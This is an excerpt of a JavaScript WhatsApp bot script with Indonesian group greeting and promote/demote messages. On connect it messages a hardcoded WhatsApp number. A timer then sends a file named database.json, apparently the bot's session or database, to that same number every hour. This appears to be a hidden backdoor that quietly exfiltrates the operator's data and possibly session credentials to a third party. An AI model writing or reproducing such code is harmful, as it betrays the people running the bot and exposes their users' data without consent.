...
console.log(chalk.green('Connected✅'))
      await conn.sendMessage("6289515466912@s.whatsapp.net", global.ftoli)
  }
    }
if (!opts['test']) {
...
setInterval(async () => {
    ...
    return await conn.sendMessage('6289515466912@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
...
reloadHandler = function (restatConn) {
  ...
  conn.bye = 'Goodbyee @user beban!'
  conn.spromote = '@user sekarang sepuh!'
  conn.sdemote = '@user sekarang bukan sepuh!'
